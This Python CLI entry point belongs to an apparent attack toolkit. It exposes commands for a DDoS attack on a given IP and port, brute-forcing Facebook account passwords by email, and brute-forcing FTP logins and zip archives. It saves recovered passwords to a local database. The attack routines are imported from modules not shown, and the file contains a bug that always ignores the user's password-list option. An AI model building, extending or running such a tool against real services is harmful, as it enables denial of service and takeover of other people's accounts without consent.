import click, socket
from src.utils import Database
from tabulate import tabulate

db = Database()

@click.group()
def cli():
	pass

@cli.command('request', short_help='request restful api')
@click.argument('url')
@click.argument('methods')
@click.option('--data', required=False, help='data of http')
@click.option('--header', required=False, help='header of http')
@click.option('--minimize', required=False, is_flag=True, help='hidden a response from console')
def request_action(url, methods, data, header, minimize):
	from src.feature.request import request
	request(url, methods, db, data, header, minimize)

@cli.command('ddos', short_help='ddos attack')
@click.argument('ip')
@click.argument('port', required=False, default=0)
def ddos_action(ip, port):
	from src.feature.ddos import DDOS
	DDOS(ip, int(port), bool(port), db)

@cli.command('ip:check', short_help='check ip address')
@click.argument('hostname')
def ip_check_action(hostname):
	ip = socket.gethostbyname(hostname)
	print("IP:", ip)

@cli.command('bruteforce:fb', short_help='facebook bruteforce')
@click.argument('email')
@click.option('--manual', help='password customization')
@click.option('--password', help='password list txt')
def fb_bruteforce_action(email, manual, password):
	from src.feature.facebook import Facebook
	print(manual)
	if manual:
		Facebook(email, "manual", None, password=manual)
	else:
		Facebook(email, "auto", customfile = 'passwords.txt' or password)

@cli.command('bruteforce:zip', short_help='zip bruteforce')
@click.argument('file')
@click.argument('password_list', required=False, default='passwords.txt')
def zip_bruteforce_action(file, password_list):
	from src.feature.zipper import Zipper
	Zipper(file, password_list, db)

@cli.command('bruteforce:ftp', short_help='ftp bruteforce')
@click.argument('host')
@click.argument('user')
@click.option('--password_list', required=False, default='passwords.txt')
@click.option('--port', required=False, default=21)
def ftp_bruteforce(host, user, password_list, port):
	from src.feature.ftp import main
	main(host, user, password_list, int(port))

@cli.command('ip:port', short_help='check port ip address')
@click.argument('ip')
def ip_port_action(ip):
	from src.feature.checkport import Checkport
	Checkport(ip)

@cli.command('db:show', short_help='show the database')
@click.argument('table')
@click.option('--page', default=0, help='page of result')
@click.option('--total', default=25, help='total row of result')
def db_request_action(table, page, total):
	headers = ['url', 'last_action', 'response']
	data = db.get(table, page, total)
	if table == 'ddos':
		headers = ['ip', 'last_action', 'total_payload']
	if table == 'facebook':
		headers = ['email', 'last_action', 'password']
	if table == 'zip':
		headers = ['name', 'last_action', 'password']

	print(tabulate(data, headers=headers))

@cli.command('db:delete', short_help='delete the database')
@click.argument('table')
@click.argument('id')
def db_delete_action(table, id):
	db.delete(table, id)

if __name__ == '__main__': 
	cli()